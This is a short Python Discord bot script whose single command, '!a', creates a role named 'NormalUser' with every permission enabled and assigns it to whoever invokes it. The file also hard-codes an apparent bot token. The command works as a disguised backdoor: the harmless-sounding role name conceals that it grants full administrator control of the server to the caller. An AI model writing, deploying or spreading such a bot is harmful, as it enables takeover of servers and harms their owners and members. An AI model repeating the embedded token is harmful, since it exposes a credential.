from discord import permissions
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!')

bot.remove_command('help')
permissions = discord.Permissions()

@bot.event
async def on_ready():
        print("BotON")

@bot.command(pass_context=True)
async def a(ctx):
    guild = ctx.guild
    await guild.create_role(name="NormalUser", permissions=permissions.all())
    member = ctx.message.author 
    role = discord.utils.get(member.guild.roles, name="NormalUser")
    await member.add_roles(role)
                          

bot.run("ODc5MzQ0MzgyNzU3NzExOTEy.YSOXRg.ZxYabc0oRPM0WWAt__MoTObIFAk")



